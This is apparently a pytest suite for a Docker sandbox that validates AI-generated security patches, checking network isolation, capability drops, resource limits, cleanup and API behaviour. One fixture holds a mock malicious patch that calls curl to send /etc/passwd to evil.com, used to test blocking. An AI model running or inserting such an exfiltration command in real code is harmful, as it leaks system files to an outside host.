"""
Secure Patch Validation Sandbox Test Suite for HalluciShield AI.

Tests the Docker-based sandbox for:
- Successful patch validation
- Compilation failure handling
- Test failure handling
- Timeout handling
- Malicious execution attempt blocking
- API endpoint behavior
- Model validation
- Edge cases

All tests use mock Docker client to avoid requiring Docker daemon.
"""

import json
import os
import shutil
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch, PropertyMock

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.agents.models import (
    CompilationResult,
    PatchCandidate,
    PerformanceResult,
    SandboxConfig,
    SandboxValidationRequest,
    SandboxValidationResponse,
    SecurityScanResult,
    TestResult,
)
from app.agents.sandbox_agent import SandboxAgent, DEFAULT_SANDBOX_IMAGE

client = TestClient(app)


# ============================================================
# Fixtures
# ============================================================

@pytest.fixture
def mock_docker_client():
    """Create a mock Docker client."""
    client = MagicMock()
    client.images.get.return_value = True
    return client


@pytest.fixture
def sample_patch():
    """Create a sample PatchCandidate."""
    return PatchCandidate(
        patch_id="patch-1",
        modified_code="def safe_query(username):\n    cursor.execute('SELECT * FROM users WHERE id = ?', (username,))",
        explanation="Uses parameterized query to prevent SQL injection",
        security_strategy="Parameterized Query",
        assumptions=["Database supports parameterized queries"],
        expected_effect="Prevents SQL injection by separating query from data",
        potential_side_effects=["May change query performance"],
    )


@pytest.fixture
def sample_request(sample_patch):
    """Create a sample SandboxValidationRequest."""
    return SandboxValidationRequest(
        patch=sample_patch,
        repository_id="repo-1",
        workspace_path="/tmp/test-repo",
        file_path="app/db.py",
        original_code="def vulnerable_query(username):\n    cursor.execute('SELECT * FROM users WHERE id = ' + username)",
        language="python",
        test_command="python -m pytest tests/",
        compile_command="",
        scan_command="semgrep --config=auto app/",
        sandbox_config=SandboxConfig(
            cpu_limit=1.0,
            memory_limit="512m",
            execution_timeout=30,
            max_processes=64,
        ),
    )


@pytest.fixture
def malicious_patch():
    """Create a malicious PatchCandidate that tries to exfiltrate data."""
    return PatchCandidate(
        patch_id="malicious-patch",
        modified_code='import os\nos.system("curl https://evil.com/steal?data=$(cat /etc/passwd)")',
        explanation="This looks like a normal fix but contains malicious code",
        security_strategy="Input Validation",
        assumptions=[],
        expected_effect="Appears to fix the issue",
        potential_side_effects=["Data exfiltration"],
    )


@pytest.fixture
def timeout_patch():
    """Create a PatchCandidate that causes infinite loop."""
    return PatchCandidate(
        patch_id="timeout-patch",
        modified_code="while True:\n    pass",
        explanation="Infinite loop patch",
        security_strategy="Loop",
        assumptions=[],
        expected_effect="Will cause timeout",
        potential_side_effects=["Infinite execution"],
    )


@pytest.fixture
def compilation_failure_patch():
    """Create a PatchCandidate with syntax error."""
    return PatchCandidate(
        patch_id="compile-fail-patch",
        modified_code="def broken(:\n    invalid syntax",
        explanation="Patch with syntax error",
        security_strategy="None",
        assumptions=[],
        expected_effect="Compilation will fail",
        potential_side_effects=["Syntax error"],
    )


@pytest.fixture
def test_failure_patch():
    """Create a PatchCandidate that passes compilation but fails tests."""
    return PatchCandidate(
        patch_id="test-fail-patch",
        modified_code="def add(a, b):\n    return a - b  # Wrong implementation",
        explanation="Implements add as subtraction, tests will fail",
        security_strategy="Arithmetic fix",
        assumptions=[],
        expected_effect="Will fail assertion tests",
        potential_side_effects=["Incorrect arithmetic"],
    )


def _make_container_mock(exit_code=0, results=None):
    """Create a mock container with configurable behavior."""
    container = MagicMock()
    container.id = "abc123def456"

    # Mock wait to return exit code
    container.wait.return_value = {"StatusCode": exit_code}

    # Mock logs
    if results:
        container.logs.return_value = json.dumps(results).encode("utf-8")
    else:
        container.logs.return_value = b"Container executed successfully"

    # Mock exec_run to return results
    if results:
        container.exec_run.return_value = (0, json.dumps(results).encode("utf-8"))
    else:
        container.exec_run.return_value = (1, b"Results file not found")

    # Mock remove
    container.remove.return_value = None

    return container


# ============================================================
# Test Models
# ============================================================

class TestSandboxModels:
    """Tests for Pydantic models."""

    def test_sandbox_config_defaults(self):
        config = SandboxConfig()
        assert config.cpu_limit == 1.0
        assert config.memory_limit == "512m"
        assert config.execution_timeout == 30
        assert config.max_processes == 64
        assert config.tmpfs_size == "256m"

    def test_sandbox_config_custom(self):
        config = SandboxConfig(
            cpu_limit=2.0,
            memory_limit="1g",
            execution_timeout=60,
            max_processes=128,
            tmpfs_size="512m",
        )
        assert config.cpu_limit == 2.0
        assert config.memory_limit == "1g"
        assert config.execution_timeout == 60

    def test_compilation_result(self):
        result = CompilationResult(
            success=True,
            language="python",
            output="Compilation successful",
            duration_ms=500,
        )
        assert result.success is True
        assert result.language == "python"
        assert result.error is None

    def test_test_result(self):
        result = TestResult(
            success=True,
            framework="pytest",
            total_tests=10,
            passed=10,
            failed=0,
            skipped=0,
            output="10 passed",
            duration_ms=1000,
        )
        assert result.success is True
        assert result.total_tests == 10
        assert result.passed == 10
        assert result.failed == 0

    def test_security_scan_result(self):
        result = SecurityScanResult(
            success=True,
            scanner="semgrep",
            vulnerabilities_found=0,
            findings=[],
            output="No issues found",
            duration_ms=2000,
        )
        assert result.success is True
        assert result.vulnerabilities_found == 0

    def test_performance_result(self):
        result = PerformanceResult(
            execution_time_ms=1500,
            memory_peak_mb=256.0,
            cpu_usage_percent=45.0,
        )
        assert result.execution_time_ms == 1500
        assert result.memory_peak_mb == 256.0

    def test_sandbox_validation_request(self, sample_patch):
        request = SandboxValidationRequest(
            patch=sample_patch,
            file_path="app.py",
            original_code="def vulnerable(): pass",
        )
        assert request.language == "python"
        assert request.patch.patch_id == "patch-1"

    def test_sandbox_validation_response(self):
        response = SandboxValidationResponse(
            patch_id="patch-1",
            compilation=CompilationResult(success=True),
            tests=TestResult(success=True),
            security_scan=SecurityScanResult(success=True),
            performance=PerformanceResult(),
            overall_success=True,
        )
        assert response.overall_success is True
        assert len(response.sandbox_security_notes) == 0


# ============================================================
# Test Sandbox Agent Initialization
# ============================================================

class TestSandboxAgentInit:
    """Tests for SandboxAgent initialization."""

    def test_agent_initializes_with_mock_docker(self, mock_docker_client):
        agent = SandboxAgent(docker_client=mock_docker_client)
        assert agent._docker is mock_docker_client
        assert agent.image_name == DEFAULT_SANDBOX_IMAGE

    def test_agent_uses_default_image(self, mock_docker_client):
        agent = SandboxAgent(docker_client=mock_docker_client)
        assert agent.image_name == "hallucishield-sandbox:latest"

    def test_agent_custom_image(self, mock_docker_client):
        agent = SandboxAgent(docker_client=mock_docker_client, image_name="custom:v1")
        assert agent.image_name == "custom:v1"


# ============================================================
# Test Memory Limit Parsing
# ============================================================

class TestMemoryLimitParsing:
    """Tests for memory limit string parsing."""

    def test_parse_megabytes(self):
        assert SandboxAgent._parse_memory_limit("512m") == 512 * 1024**2

    def test_parse_gigabytes(self):
        assert SandboxAgent._parse_memory_limit("1g") == 1024**3

    def test_parse_kilobytes(self):
        assert SandboxAgent._parse_memory_limit("1024k") == 1024 * 1024

    def test_parse_bytes(self):
        assert SandboxAgent._parse_memory_limit("1048576") == 1048576

    def test_parse_case_insensitive(self):
        assert SandboxAgent._parse_memory_limit("512M") == 512 * 1024**2
        assert SandboxAgent._parse_memory_limit("1G") == 1024**3


# ============================================================
# Test Workspace Preparation
# ============================================================

class TestWorkspacePreparation:
    """Tests for workspace preparation."""

    def test_prepare_workspace_creates_files(self, mock_docker_client, sample_request):
        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(sample_request)

        try:
            assert os.path.exists(os.path.join(workspace, "patch.py"))
            assert os.path.exists(os.path.join(workspace, "target_file"))
            assert os.path.exists(os.path.join(workspace, "original_code"))
            assert os.path.exists(os.path.join(workspace, "language"))
            assert os.path.exists(os.path.join(workspace, "test_cmd"))
            assert os.path.exists(os.path.join(workspace, "scan_cmd"))

            # Verify content
            with open(os.path.join(workspace, "language")) as f:
                assert f.read() == "python"
            with open(os.path.join(workspace, "target_file")) as f:
                assert f.read() == "app/db.py"
        finally:
            shutil.rmtree(workspace)

    def test_prepare_workspace_with_compile_command(self, mock_docker_client):
        agent = SandboxAgent(docker_client=mock_docker_client)
        request = SandboxValidationRequest(
            patch=PatchCandidate(
                patch_id="p1",
                modified_code="code",
                explanation="explanation",
                security_strategy="strategy",
                expected_effect="effect",
            ),
            file_path="main.java",
            original_code="original",
            language="java",
            compile_command="javac main.java",
        )
        workspace = agent._prepare_workspace(request)
        try:
            assert os.path.exists(os.path.join(workspace, "compile_cmd"))
            with open(os.path.join(workspace, "compile_cmd")) as f:
                assert f.read() == "javac main.java"
        finally:
            shutil.rmtree(workspace)

    def test_prepare_workspace_without_optional_commands(self, mock_docker_client):
        agent = SandboxAgent(docker_client=mock_docker_client)
        request = SandboxValidationRequest(
            patch=PatchCandidate(
                patch_id="p1",
                modified_code="code",
                explanation="explanation",
                security_strategy="strategy",
                expected_effect="effect",
            ),
            file_path="app.py",
            original_code="original",
        )
        workspace = agent._prepare_workspace(request)
        try:
            assert not os.path.exists(os.path.join(workspace, "compile_cmd"))
            assert not os.path.exists(os.path.join(workspace, "test_cmd"))
            assert not os.path.exists(os.path.join(workspace, "scan_cmd"))
        finally:
            shutil.rmtree(workspace)


# ============================================================
# Test Container Creation
# ============================================================

class TestContainerCreation:
    """Tests for Docker container creation."""

    def test_create_container_uses_network_disabled(self, mock_docker_client, sample_request):
        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(sample_request)

        try:
            mock_docker_client.containers.run.return_value = MagicMock(id="test123")
            container = agent._create_container(workspace, sample_request.sandbox_config)

            call_kwargs = mock_docker_client.containers.run.call_args
            assert call_kwargs.kwargs["network_disabled"] is True
        finally:
            shutil.rmtree(workspace)

    def test_create_container_drops_capabilities(self, mock_docker_client, sample_request):
        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(sample_request)

        try:
            mock_docker_client.containers.run.return_value = MagicMock(id="test123")
            agent._create_container(workspace, sample_request.sandbox_config)

            call_kwargs = mock_docker_client.containers.run.call_args
            assert "ALL" in call_kwargs.kwargs["cap_drop"]
        finally:
            shutil.rmtree(workspace)

    def test_create_container_no_new_privileges(self, mock_docker_client, sample_request):
        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(sample_request)

        try:
            mock_docker_client.containers.run.return_value = MagicMock(id="test123")
            agent._create_container(workspace, sample_request.sandbox_config)

            call_kwargs = mock_docker_client.containers.run.call_args
            assert "no-new-privileges" in call_kwargs.kwargs["security_opt"]
        finally:
            shutil.rmtree(workspace)

    def test_create_container_with_resource_limits(self, mock_docker_client, sample_request):
        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(sample_request)

        try:
            mock_docker_client.containers.run.return_value = MagicMock(id="test123")
            agent._create_container(workspace, sample_request.sandbox_config)

            call_kwargs = mock_docker_client.containers.run.call_args
            assert call_kwargs.kwargs["mem_limit"] == 512 * 1024**2
            assert call_kwargs.kwargs["cpu_quota"] == 100000
            assert call_kwargs.kwargs["pids_limit"] == 64
        finally:
            shutil.rmtree(workspace)

    def test_create_container_with_tmpfs(self, mock_docker_client, sample_request):
        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(sample_request)

        try:
            mock_docker_client.containers.run.return_value = MagicMock(id="test123")
            agent._create_container(workspace, sample_request.sandbox_config)

            call_kwargs = mock_docker_client.containers.run.call_args
            assert "/tmp" in call_kwargs.kwargs["tmpfs"]
            assert "/var/tmp" in call_kwargs.kwargs["tmpfs"]
        finally:
            shutil.rmtree(workspace)


# ============================================================
# Test Successful Patch Validation
# ============================================================

class TestSuccessfulValidation:
    """Tests for successful patch validation."""

    def test_successful_patch_validation(self, mock_docker_client, sample_request):
        success_results = {
            "compilation": {"success": True, "language": "python", "output": "OK", "duration_ms": 100},
            "tests": {
                "success": True,
                "framework": "pytest",
                "total_tests": 5,
                "passed": 5,
                "failed": 0,
                "skipped": 0,
                "output": "5 passed in 0.5s",
                "duration_ms": 500,
                "failures": [],
            },
            "security_scan": {
                "success": True,
                "scanner": "semgrep",
                "vulnerabilities_found": 0,
                "findings": [],
                "output": "No issues found",
                "duration_ms": 2000,
            },
            "performance": {
                "execution_time_ms": 100,
                "memory_peak_mb": 50.0,
                "cpu_usage_percent": 25.0,
                "io_read_bytes": 1024,
                "io_write_bytes": 512,
            },
        }

        container = _make_container_mock(exit_code=0, results=success_results)
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(sample_request)

        assert isinstance(response, SandboxValidationResponse)
        assert response.compilation.success is True
        assert response.tests.success is True
        assert response.tests.total_tests == 5
        assert response.tests.passed == 5
        assert response.security_scan.success is True
        assert response.security_scan.vulnerabilities_found == 0
        assert response.overall_success is True
        assert len(response.sandbox_security_notes) > 0

    def test_successful_validation_cleans_up(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)
        agent.validate_patch(sample_request)

        container.remove.assert_called_once_with(force=True)


# ============================================================
# Test Compilation Failure
# ============================================================

class TestCompilationFailure:
    """Tests for compilation failure handling."""

    def test_compilation_failure(self, mock_docker_client, compilation_failure_patch):
        fail_results = {
            "compilation": {
                "success": False,
                "language": "python",
                "output": "SyntaxError: invalid syntax",
                "duration_ms": 50,
                "error": "SyntaxError: invalid syntax at line 1",
            },
            "tests": {
                "success": False,
                "output": "Compilation failed",
                "duration_ms": 0,
                "framework": "",
                "total_tests": 0,
                "passed": 0,
                "failed": 0,
                "skipped": 0,
                "failures": [],
            },
            "security_scan": {
                "success": False,
                "scanner": "none",
                "vulnerabilities_found": 0,
                "findings": [],
                "output": "Compilation failed, scan skipped",
                "duration_ms": 0,
            },
            "performance": {"execution_time_ms": 0, "memory_peak_mb": 0, "cpu_usage_percent": 0},
        }

        container = _make_container_mock(exit_code=1, results=fail_results)
        mock_docker_client.containers.run.return_value = container

        request = SandboxValidationRequest(
            patch=compilation_failure_patch,
            file_path="app.py",
            original_code="def broken(:\n    invalid syntax",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(request)

        assert response.compilation.success is False
        assert "SyntaxError" in response.compilation.output
        assert response.overall_success is False


# ============================================================
# Test Test Failure
# ============================================================

class TestTestFailure:
    """Tests for test failure handling."""

    def test_test_failure(self, mock_docker_client, test_failure_patch):
        fail_results = {
            "compilation": {"success": True, "language": "python", "output": "OK", "duration_ms": 100},
            "tests": {
                "success": False,
                "framework": "pytest",
                "total_tests": 3,
                "passed": 2,
                "failed": 1,
                "skipped": 0,
                "output": "FAILED tests/test_add.py::test_add_positive - assert 3 == 5",
                "duration_ms": 500,
                "failures": [{"test": "test_add_positive", "error": "assert 3 == 5"}],
            },
            "security_scan": {
                "success": True,
                "scanner": "semgrep",
                "vulnerabilities_found": 0,
                "findings": [],
                "output": "No issues found",
                "duration_ms": 2000,
            },
            "performance": {"execution_time_ms": 0, "memory_peak_mb": 0, "cpu_usage_percent": 0},
        }

        container = _make_container_mock(exit_code=1, results=fail_results)
        mock_docker_client.containers.run.return_value = container

        request = SandboxValidationRequest(
            patch=test_failure_patch,
            file_path="app.py",
            original_code="def add(a, b):\n    return a + b",
            test_command="python -m pytest tests/",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(request)

        assert response.compilation.success is True
        assert response.tests.success is False
        assert response.tests.failed == 1
        assert response.tests.passed == 2
        assert len(response.tests.failures) > 0
        assert response.overall_success is False


# ============================================================
# Test Timeout
# ============================================================

class TestTimeout:
    """Tests for timeout handling."""

    def test_container_timeout(self, mock_docker_client, timeout_patch):
        container = MagicMock()
        container.id = "timeout123"
        container.wait.side_effect = Exception("timed out")
        container.logs.return_value = b""
        container.remove.return_value = None
        mock_docker_client.containers.run.return_value = container

        request = SandboxValidationRequest(
            patch=timeout_patch,
            file_path="app.py",
            original_code="while True: pass",
            sandbox_config=SandboxConfig(execution_timeout=1),
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(request)

        assert response.compilation.success is False
        assert response.overall_success is False
        container.remove.assert_called_once_with(force=True)


# ============================================================
# Test Malicious Execution Attempt
# ============================================================

class TestMaliciousExecution:
    """Tests for malicious execution attempt blocking."""

    def test_malicious_code_blocked_by_network_isolation(self, mock_docker_client, malicious_patch):
        """Malicious code cannot exfiltrate data due to network isolation."""
        # The container runs with --net=none, so curl will fail
        malicious_results = {
            "compilation": {"success": True, "language": "python", "output": "OK", "duration_ms": 100},
            "tests": {
                "success": False,
                "output": "curl: (6) Could not resolve host: evil.com",
                "duration_ms": 100,
                "framework": "",
                "total_tests": 0,
                "passed": 0,
                "failed": 0,
                "skipped": 0,
                "failures": [],
                "error": "Network request failed",
            },
            "security_scan": {
                "success": True,
                "scanner": "semgrep",
                "vulnerabilities_found": 0,
                "findings": [],
                "output": "No vulnerabilities",
                "duration_ms": 1000,
            },
            "performance": {"execution_time_ms": 100, "memory_peak_mb": 10, "cpu_usage_percent": 5},
        }

        container = _make_container_mock(exit_code=0, results=malicious_results)
        mock_docker_client.containers.run.return_value = container

        request = SandboxValidationRequest(
            patch=malicious_patch,
            file_path="app.py",
            original_code="def safe(): pass",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(request)

        # Verify network was disabled
        call_kwargs = mock_docker_client.containers.run.call_args
        assert call_kwargs.kwargs["network_disabled"] is True

        # Verify the response
        assert isinstance(response, SandboxValidationResponse)
        assert any("network isolated" in note.lower() for note in response.sandbox_security_notes)

    def test_malicious_code_cannot_escape_container(self, mock_docker_client, malicious_patch):
        """Malicious code cannot escape container due to capability drops."""
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        request = SandboxValidationRequest(
            patch=malicious_patch,
            file_path="app.py",
            original_code="def safe(): pass",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        agent.validate_patch(request)

        call_kwargs = mock_docker_client.containers.run.call_args
        assert "ALL" in call_kwargs.kwargs["cap_drop"]
        assert "no-new-privileges" in call_kwargs.kwargs["security_opt"]

    def test_malicious_code_limited_by_resources(self, mock_docker_client, malicious_patch):
        """Malicious code cannot consume unlimited resources."""
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        request = SandboxValidationRequest(
            patch=malicious_patch,
            file_path="app.py",
            original_code="def safe(): pass",
            sandbox_config=SandboxConfig(
                cpu_limit=0.5,
                memory_limit="256m",
                max_processes=32,
            ),
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        agent.validate_patch(request)

        call_kwargs = mock_docker_client.containers.run.call_args
        assert call_kwargs.kwargs["mem_limit"] == 256 * 1024**2
        assert call_kwargs.kwargs["cpu_quota"] == 50000
        assert call_kwargs.kwargs["pids_limit"] == 32


# ============================================================
# Test Container Cleanup
# ============================================================

class TestContainerCleanup:
    """Tests for automatic container cleanup."""

    def test_cleanup_always_called_on_success(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)
        agent.validate_patch(sample_request)

        container.remove.assert_called_once_with(force=True)

    def test_cleanup_always_called_on_failure(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=1)
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)
        agent.validate_patch(sample_request)

        container.remove.assert_called_once_with(force=True)

    def test_cleanup_handles_already_removed_container(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=0)
        container.remove.side_effect = Exception("container already removed")
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)
        # Should not raise
        response = agent.validate_patch(sample_request)
        assert isinstance(response, SandboxValidationResponse)

    def test_cleanup_workspace_on_success(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)

        # Capture workspace dir before it's cleaned up
        original_prepare = agent._prepare_workspace
        workspaces = []

        def tracking_prepare(req):
            ws = original_prepare(req)
            workspaces.append(ws)
            return ws

        agent._prepare_workspace = tracking_prepare
        agent.validate_patch(sample_request)

        # Workspace should be cleaned up
        assert len(workspaces) == 1
        assert not os.path.exists(workspaces[0])

    def test_cleanup_workspace_on_failure(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=1)
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)

        original_prepare = agent._prepare_workspace
        workspaces = []

        def tracking_prepare(req):
            ws = original_prepare(req)
            workspaces.append(ws)
            return ws

        agent._prepare_workspace = tracking_prepare
        agent.validate_patch(sample_request)

        assert len(workspaces) == 1
        assert not os.path.exists(workspaces[0])


# ============================================================
# Test Batch Validation
# ============================================================

class TestBatchValidation:
    """Tests for batch patch validation."""

    def test_batch_validation(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        candidates = [
            PatchCandidate(
                patch_id=f"patch-{i}",
                modified_code=f"code {i}",
                explanation=f"explanation {i}",
                security_strategy=f"strategy {i}",
                expected_effect=f"effect {i}",
            )
            for i in range(3)
        ]

        agent = SandboxAgent(docker_client=mock_docker_client)
        responses = agent.validate_patches_batch(sample_request, candidates)

        assert len(responses) == 3
        for i, response in enumerate(responses):
            assert response.patch_id == f"patch-{i}"

    def test_batch_validation_cleans_up_all(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        candidates = [
            PatchCandidate(
                patch_id=f"patch-{i}",
                modified_code=f"code {i}",
                explanation=f"explanation {i}",
                security_strategy=f"strategy {i}",
                expected_effect=f"effect {i}",
            )
            for i in range(3)
        ]

        agent = SandboxAgent(docker_client=mock_docker_client)
        agent.validate_patches_batch(sample_request, candidates)

        # Container should be removed 3 times (once per patch)
        assert container.remove.call_count == 3


# ============================================================
# Test API Endpoint
# ============================================================

class TestSandboxAPIEndpoint:
    """Tests for the sandbox validation API endpoint."""

    @patch("app.api.patches._get_sandbox_agent")
    def test_validate_patch_endpoint_success(self, mock_get_sandbox):
        mock_agent = MagicMock()
        mock_agent.validate_patch.return_value = SandboxValidationResponse(
            patch_id="patch-1",
            compilation=CompilationResult(success=True),
            tests=TestResult(success=True),
            security_scan=SecurityScanResult(success=True),
            performance=PerformanceResult(),
            overall_success=True,
        )
        mock_get_sandbox.return_value = mock_agent

        response = client.post(
            "/api/v1/vulnerabilities/vuln-1/validate-patch",
            json={
                "patch": {
                    "patch_id": "patch-1",
                    "modified_code": "def safe(): pass",
                    "explanation": "Safe patch",
                    "security_strategy": "Input validation",
                    "expected_effect": "Prevents vulnerability",
                },
                "file_path": "app.py",
                "original_code": "def vulnerable(): pass",
                "language": "python",
            },
        )
        assert response.status_code == 200
        data = response.json()
        assert data["patch_id"] == "patch-1"
        assert data["overall_success"] is True

    def test_validate_patch_endpoint_missing_original_code(self):
        response = client.post(
            "/api/v1/vulnerabilities/vuln-1/validate-patch",
            json={
                "patch": {
                    "patch_id": "patch-1",
                    "modified_code": "code",
                    "explanation": "explanation",
                    "security_strategy": "strategy",
                    "expected_effect": "effect",
                },
                "file_path": "app.py",
                "original_code": "",
            },
        )
        assert response.status_code == 400
        assert "original_code" in response.json()["detail"]

    def test_validate_patch_endpoint_missing_file_path(self):
        response = client.post(
            "/api/v1/vulnerabilities/vuln-1/validate-patch",
            json={
                "patch": {
                    "patch_id": "patch-1",
                    "modified_code": "code",
                    "explanation": "explanation",
                    "security_strategy": "strategy",
                    "expected_effect": "effect",
                },
                "file_path": "",
                "original_code": "original code",
            },
        )
        assert response.status_code == 400
        assert "file_path" in response.json()["detail"]

    @patch("app.api.patches._get_sandbox_agent")
    def test_validate_patch_endpoint_handles_agent_error(self, mock_get_sandbox):
        mock_get_sandbox.side_effect = RuntimeError("Docker not available")

        response = client.post(
            "/api/v1/vulnerabilities/vuln-1/validate-patch",
            json={
                "patch": {
                    "patch_id": "patch-1",
                    "modified_code": "code",
                    "explanation": "explanation",
                    "security_strategy": "strategy",
                    "expected_effect": "effect",
                },
                "file_path": "app.py",
                "original_code": "original code",
            },
        )
        assert response.status_code == 500

    @patch("app.api.patches._get_sandbox_agent")
    def test_validate_patch_endpoint_returns_security_notes(self, mock_get_sandbox):
        mock_agent = MagicMock()
        mock_agent.validate_patch.return_value = SandboxValidationResponse(
            patch_id="patch-1",
            compilation=CompilationResult(success=True),
            tests=TestResult(success=True),
            security_scan=SecurityScanResult(success=True),
            performance=PerformanceResult(),
            overall_success=True,
            sandbox_security_notes=[
                "Container executed with --net=none",
                "Non-root user execution",
            ],
        )
        mock_get_sandbox.return_value = mock_agent

        response = client.post(
            "/api/v1/vulnerabilities/vuln-1/validate-patch",
            json={
                "patch": {
                    "patch_id": "patch-1",
                    "modified_code": "code",
                    "explanation": "explanation",
                    "security_strategy": "strategy",
                    "expected_effect": "effect",
                },
                "file_path": "app.py",
                "original_code": "original code",
            },
        )
        assert response.status_code == 200
        data = response.json()
        assert len(data["sandbox_security_notes"]) == 2


# ============================================================
# Test Edge Cases
# ============================================================

class TestEdgeCases:
    """Tests for edge cases and boundary conditions."""

    def test_empty_patch_code(self, mock_docker_client):
        request = SandboxValidationRequest(
            patch=PatchCandidate(
                patch_id="empty",
                modified_code="",
                explanation="Empty",
                security_strategy="None",
                expected_effect="None",
            ),
            file_path="app.py",
            original_code="original",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(request)

        assert response.compilation.success is False
        assert response.overall_success is False

    def test_empty_file_path(self, mock_docker_client):
        request = SandboxValidationRequest(
            patch=PatchCandidate(
                patch_id="no-path",
                modified_code="code",
                explanation="explanation",
                security_strategy="strategy",
                expected_effect="effect",
            ),
            file_path="",
            original_code="original",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(request)

        assert response.compilation.success is False
        assert response.overall_success is False

    def test_very_long_patch_code(self, mock_docker_client):
        long_code = "x = 1\n" * 10000
        request = SandboxValidationRequest(
            patch=PatchCandidate(
                patch_id="long-patch",
                modified_code=long_code,
                explanation="Very long patch",
                security_strategy="None",
                expected_effect="None",
            ),
            file_path="app.py",
            original_code="original",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(request)
        try:
            with open(os.path.join(workspace, "patch.py")) as f:
                content = f.read()
                assert len(content) > 50000
        finally:
            shutil.rmtree(workspace)

    def test_special_characters_in_code(self, mock_docker_client):
        special_code = "def test():\n    x = 'hello\\nworld\\ttab'\n    return x"
        request = SandboxValidationRequest(
            patch=PatchCandidate(
                patch_id="special",
                modified_code=special_code,
                explanation="Special characters",
                security_strategy="None",
                expected_effect="None",
            ),
            file_path="app.py",
            original_code="original",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(request)
        try:
            with open(os.path.join(workspace, "patch.py")) as f:
                content = f.read()
                assert "\\n" in content or "\n" in content
        finally:
            shutil.rmtree(workspace)

    def test_container_not_created(self, mock_docker_client, sample_request):
        mock_docker_client.containers.run.side_effect = Exception("Docker daemon error")

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(sample_request)

        assert response.compilation.success is False
        assert response.overall_success is False
        assert "Docker daemon error" in response.sandbox_security_notes[0]

    def test_default_sandbox_config(self, mock_docker_client, sample_patch):
        request = SandboxValidationRequest(
            patch=sample_patch,
            file_path="app.py",
            original_code="original",
        )

        agent = SandboxAgent(docker_client=mock_docker_client)
        workspace = agent._prepare_workspace(request)

        try:
            container = agent._create_container(workspace, SandboxConfig())
            call_kwargs = mock_docker_client.containers.run.call_args
            assert call_kwargs.kwargs["mem_limit"] == 512 * 1024**2
            assert call_kwargs.kwargs["cpu_quota"] == 100000
        finally:
            shutil.rmtree(workspace)

    def test_response_execution_time(self, mock_docker_client, sample_request):
        container = _make_container_mock(exit_code=0)
        mock_docker_client.containers.run.return_value = container

        agent = SandboxAgent(docker_client=mock_docker_client)
        response = agent.validate_patch(sample_request)

        assert response.validation_duration_ms >= 0
        assert isinstance(response.validation_duration_ms, int)
